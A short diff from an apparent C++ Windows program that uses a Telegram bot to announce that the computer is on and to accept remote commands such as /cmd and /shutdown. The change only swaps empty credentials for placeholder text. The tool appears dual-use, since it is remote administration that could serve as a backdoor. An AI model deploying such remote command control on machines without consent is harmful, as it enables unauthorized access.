@@ -6,7 +6,7 @@ using namespace TelegramBot;
 
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
 {
-	Telegram tg("", "");
+	Telegram tg("your bot_api", "your chat_id"); 
 
 	tg.Send_Message("The computer is on! Example commands:  /cmd  /exit  /shutdown  /pwd ");	//start message
 
